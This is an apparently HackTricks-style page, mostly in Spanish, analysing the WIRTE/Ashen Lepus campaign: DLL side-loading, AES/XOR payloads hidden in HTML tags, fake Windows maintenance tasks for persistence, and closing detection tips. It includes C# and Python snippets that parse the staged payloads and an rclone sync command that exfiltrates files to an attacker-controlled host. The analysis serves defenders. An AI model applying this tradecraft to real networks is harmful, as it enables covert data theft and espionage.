# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Resumen de Tradecraft

Ashen Lepus (aka WIRTE) convirtió en arma un patrón repetible que encadena DLL sideloading, staged HTML payloads y modular .NET backdoors para persistir dentro de redes diplomáticas de Oriente Medio. La técnica es reutilizable por cualquier operador porque se basa en:

- **Archive-based social engineering**: PDFs benignos instruyen a las víctimas a descargar un archivo RAR desde un sitio de intercambio de archivos. El archivo agrupa un EXE visualizador de documentos convincente, una DLL maliciosa nombrada como una librería de confianza (p. ej., `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), y un `Document.pdf` señuelo.
- **DLL search order abuse**: la víctima hace doble clic en el EXE, Windows resuelve la importación de la DLL desde el directorio actual, y el loader malicioso (AshenLoader) se ejecuta dentro del proceso de confianza mientras el PDF señuelo se abre para evitar sospechas.
- **Living-off-the-land staging**: cada etapa posterior (AshenStager → AshenOrchestrator → módulos) se mantiene fuera del disco hasta que se necesita, entregada como blobs cifrados ocultos dentro de respuestas HTML que parecen inocuas.

## Cadena Multi-etapa de Side-Loading

1. **Decoy EXE → AshenLoader**: el EXE sideloadea AshenLoader, que realiza reconocimiento del host, lo cifra con AES-CTR y lo envía vía POST dentro de parámetros rotativos como `token=`, `id=`, `q=`, o `auth=` a rutas con apariencia de API (p. ej., `/api/v2/account`).
2. **HTML extraction**: el C2 solo revela la siguiente etapa cuando la IP del cliente geolocaliza a la región objetivo y el `User-Agent` coincide con el implant, frustrando sandboxes. Cuando las comprobaciones pasan, el cuerpo HTTP contiene un blob `<headerp>...</headerp>` con el payload AshenStager cifrado en Base64/AES-CTR.
3. **Second sideload**: AshenStager se despliega con otro binario legítimo que importa `wtsapi32.dll`. La copia maliciosa inyectada en el binario obtiene más HTML, esta vez esculpiendo `<article>...</article>` para recuperar AshenOrchestrator.
4. **AshenOrchestrator**: un controlador modular .NET que decodifica una configuración JSON en Base64. Los campos de la config `tg` y `au` se concatenan/hashean en la clave AES, que descifra `xrk`. Los bytes resultantes actúan como clave XOR para cada blob de módulo que se obtenga posteriormente.
5. **Module delivery**: cada módulo se describe mediante comentarios HTML que redirigen al parser a una etiqueta arbitraria, rompiendo reglas estáticas que solo buscan `<headerp>` o `<article>`. Los módulos incluyen persistencia (`PR*`), uninstallers (`UN*`), reconocimiento (`SN`), captura de pantalla (`SCT`) y exploración de archivos (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Incluso si los defensores bloquean o eliminan un elemento específico, el operador solo necesita cambiar la etiqueta indicada en el comentario HTML para reanudar la entrega.

### Ayudante rápido de extracción (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Paralelos de evasión de HTML Staging

La investigación reciente sobre HTML smuggling (Talos) destaca payloads ocultos como cadenas Base64 dentro de bloques `<script>` en adjuntos HTML y decodificados vía JavaScript en tiempo de ejecución. El mismo truco puede reutilizarse para respuestas C2: stagear blobs cifrados dentro de una etiqueta `<script>` (u otro elemento DOM) y decodificarlos en memoria antes de AES/XOR, haciendo que la página parezca HTML ordinario. Talos también muestra ofuscación en capas (renombrado de identificadores más Base64/Caesar/AES) dentro de etiquetas `<script>`, lo que se mapea limpiamente a blobs C2 stageados en HTML.

## Notas sobre variantes recientes (2024-2025)

- Check Point observó campañas WIRTE en 2024 que todavía dependían de sideloading basado en archivos pero usaban `propsys.dll` (stagerx64) como la primera etapa. El stager decodifica el siguiente payload con Base64 + XOR (key `53`), envía peticiones HTTP con un `User-Agent` hardcodeado, y extrae blobs cifrados embebidos entre etiquetas HTML. En una rama, la etapa se reconstruyó a partir de una larga lista de cadenas IP embebidas decodificadas vía `RtlIpv4StringToAddressA`, luego concatenadas en los bytes del payload.
- OWN-CERT documentó herramientas WIRTE anteriores donde el dropper side-loaded `wtsapi32.dll` protegía strings con Base64 + TEA y usaba el nombre del DLL como clave de decriptación, luego XOR/Base64-ofuscaba datos de identificación de host antes de enviarlos al C2.

## Endurecimiento de Crypto y C2

- AES-CTR everywhere: los loaders actuales embeben claves de 256 bits más nonces (p. ej., `{9a 20 51 98 ...}`) y opcionalmente añaden una capa XOR usando strings como `msasn1.dll` antes/después de la decriptación.
- Variaciones de material de clave: loaders anteriores usaban Base64 + TEA para proteger strings embebidas, con la clave de decriptación derivada del nombre del DLL malicioso (p. ej., `wtsapi32.dll`).
- Infrastructure split + subdomain camouflage: los servidores de staging están separados por herramienta, hospedados en ASNs variados y a veces frontados por subdominios con apariencia legítima, de modo que quemar una etapa no expone el resto.
- Recon smuggling: los datos enumerados ahora incluyen listados de Program Files para detectar apps de alto valor y siempre se cifran antes de salir del host.
- URI churn: parámetros de query y rutas REST rotan entre campañas (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidando detecciones frágiles.
- User-Agent pinning + safe redirects: la infraestructura C2 responde solo a strings UA exactos y, de lo contrario, redirige a sitios benignos de noticias/salud para camuflarse.
- Gated delivery: los servidores están geo-restringidos y solo responden a implants reales. Clientes no aprobados reciben HTML no sospechoso.

## Persistencia y bucle de ejecución

AshenStager deja scheduled tasks que se hacen pasar por trabajos de mantenimiento de Windows y se ejecutan vía `svchost.exe`, p. ej.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Estas tareas relanzan la cadena de sideloading al arrancar o en intervalos, asegurando que AshenOrchestrator pueda solicitar módulos frescos sin tocar disco de nuevo.

## Uso de clientes de sincronización benignos para exfiltración

Los operadores colocan documentos diplomáticos en `C:\Users\Public` (legible por todos y no sospechoso) mediante un módulo dedicado, y luego descargan el binario legítimo de [Rclone](https://rclone.org/) para sincronizar ese directorio con el almacenamiento controlado por el atacante. Unit42 señala que es la primera vez que este actor se ha observado usando Rclone para exfiltración, alineándose con la tendencia más amplia de abusar de herramientas de sincronización legítimas para mezclarse con tráfico normal:

1. Stage: copiar/coleccionar archivos objetivo en `C:\Users\Public\{campaign}\`.
2. Configure: enviar un config de Rclone apuntando a un endpoint HTTPS controlado por el atacante (p. ej., `api.technology-system[.]com`).
3. Sync: ejecutar `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` para que el tráfico se asemeje a backups en la nube normales.

Debido a que Rclone se usa ampliamente para flujos de backup legítimos, los defensores deben centrarse en ejecuciones anómalas (nuevos binarios, remotes extraños, o sincronizaciones repentinas de `C:\Users\Public`).

## Puntos de detección

- Alertar sobre procesos firmados que inesperadamente cargan DLLs desde rutas escribibles por usuarios (filtros de Procmon + `Get-ProcessMitigation -Module`), especialmente cuando los nombres de DLL se solapan con `netutils`, `srvcli`, `dwampi`, o `wtsapi32`.
- Inspeccionar respuestas HTTPS sospechosas por grandes blobs Base64 embebidos dentro de etiquetas inusuales o protegidos por comentarios `<!-- TAG: <xyz> -->`.
- Extender la caza en HTML a cadenas Base64 dentro de bloques `<script>` (estilo HTML smuggling) que se decodifican vía JavaScript antes del procesamiento AES/XOR.
- Buscar scheduled tasks que ejecuten `svchost.exe` con argumentos no propios de servicios o que apunten de vuelta a directorios de droppers.
- Rastrear C2 redirects que solo devuelven payloads para `User-Agent` exactos y de lo contrario rebotan a dominios legítimos de noticias/salud.
- Monitorizar apariciones de binarios Rclone fuera de ubicaciones gestionadas por TI, nuevos `rclone.conf`, o jobs de sincronización que tiran de directorios de staging como `C:\Users\Public`.

## Referencias

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)

{{#include ../../../banners/hacktricks-training.md}}
